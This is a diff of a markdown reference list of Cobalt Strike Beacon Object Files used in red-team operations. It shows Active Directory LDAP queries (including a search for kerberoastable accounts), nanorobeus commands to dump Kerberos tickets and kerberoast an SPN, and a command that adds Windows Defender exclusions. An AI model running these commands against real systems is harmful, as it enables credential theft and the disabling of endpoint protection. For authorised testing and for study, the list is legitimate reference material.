@@ -34,7 +34,7 @@ whoami --> Runs whoami /all
 # LDAP search examples:
 ldapsearch [query] --> Run LDAP queries in the domain
 ldapsearch “(&(objectCategory=group)(name=Domain Admins))” --> Get all Domain Admins
-ldapsearch  “(&(&(servicePrincipalName=*)(UserAccountControl:1.2.840.113556.1.4.803:=512))(!(Us erAccountControl:1.2.840.113556.1.4.803:=2)))"” --> Get kerberoastable accounts with SPNs set
+ldapsearch “(&(&(servicePrincipalName=*)(UserAccountControl:1.2.840.113556.1.4.803:=512))(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))"” --> Get kerberoastable accounts with SPNs set
 ldapsearch "(&(objectClass=user)(samaccountname=*$))" --> Get all machine accounts
 ldapsearch "(objectCategory=groupPolicyContainer)" --> Get all GPOs
 ldapsearch "(objectClass=trustedDomain)" --> Get domain trusts
@@ -285,7 +285,7 @@ nanorobeus64 dump /all --> Dump all Kerberos tickets, requires local admin privi
 nanorobeus64 kerberoast /spn:HTTP/server.fortress.local --> Kerberoast a specific SPN
 ```
 
-- [**Defender-Exclusions-Creator**](https://github.com/EspressoCake/Defender-Exclusions-Creator-BOF)
+- [**Defender-Exclusions-Creator**](https://github.com/EspressoCake/Defender-Exclusions-Creator-BOF)<br />
 Easily create, add, or remove Windows Defender exclusions using this BOF. Supports "Add/Remove" methods and exclution types "Path/Process/Extension".<br />
 ```
 # Help
@@ -304,6 +304,9 @@ cEnumDefenderException add path C:\users\USERNAME\Downloads\ HOSTNAME.domain.loc
 ### Miscellaneous
 - [**BOF Template**](https://github.com/Cobalt-Strike/bof_template)<br />
 Used for creating your very own BOFs!
+
+- [**Cobalt Strike Blog: Simplifying BOF development**]((https://www.cobaltstrike.com/blog/simplifying-bof-development)<br />
+BOFs in Cobalt Strike can now be written in C++ as of August, 2023.
 
 - [**BOF Hound**](https://github.com/fortalice/bofhound)<br />
 An offline BloodHound ingestor and LDAP parser to be used with TrustedSec's ["ldapsearch"](https://github.com/trustedsec/CS-Situational-Awareness-BOF).<br />
